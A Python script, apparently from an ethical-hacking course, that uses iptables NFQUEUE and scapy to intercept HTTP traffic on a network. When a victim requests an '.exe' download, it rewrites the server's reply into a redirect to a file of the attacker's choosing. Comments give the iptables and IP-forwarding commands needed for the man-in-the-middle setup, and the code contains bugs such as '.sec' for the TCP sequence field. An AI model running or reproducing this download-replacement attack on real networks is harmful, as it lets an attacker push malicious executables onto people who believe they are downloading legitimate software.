#! /usr/bin/env python

#to replace the downlad request by the user with our very own file
# extended from dns_spoofer.py


#on cli > iptables -I FORWARD -j NFQUEUE --queue-num 0
# FORWARD is used only when requests is coming from other computer
# OUTPUT is used only when requests is coming from same computer
# INPUT is used only when requests is coming from same computer
# so use that on cli command 2 times first on input then on output with same --queue-num 0




#dport = http means its a request d= destinaton or port=80
#sport = http means its a response s= source or port=80

import netfilterqueue
import scapy.all as scapy

def set_load(scapy_pack,url):
    scapy_pack[scapy.Raw].load = url
    del scapy_pack[scapy.IP].len
    del scapy_pack[scapy.IP].chksum
    del scapy_pack[scapy.TCP].chksum
    return scapy_pack

ack_list = []
def packet_process(packet):
    scapy_pack = scapy.IP(packet.get_payload())
    #1 print(scapy_pack.show())
    if scapy_pack.haslayer(scapy.Raw):
        if scapy_pack[scapy.TCP].dport == 80:
            #print("[+]HTTP request")
            #2 print(scapy_pack.show())
            if "exe" in scapy_pack[scapy.Raw].load:
                print("[+]exe Request")
                ack_list.append(scapy_pack[scapy.TCP].ack)
                print(scapy_pack.show())
                # we can modify the request but that we require us to establish a handshake
                # so we try to modify the response as the handshake will already be established
        elif scapy_pack[scapy.TCP].sport == 80:
            if scapy_pack[scapy.TCP].sec in ack_list:
                ack_list.remove(scapy_pack[scapy.TCP].sec)
                print("[+]Replacing file")
                modified_pack = set_load(scapy_pack, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.example.org/index.asp\n\n")

                packet.set_payload(str(modified_pack))
                print(packet.get_payload())  # to see whats inside the packet
                # print(packet) # it will only give output like TCP 40 bytes

    packet.accept()
            #print("[+]HTTP response")


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, packet_process)
queue.run()



# the yrl link can be anyfile which even we can serve from our kali server
#todo ~echo 1 > /proc/sys/net/ipv4/ip_forward to allow kali forward the requests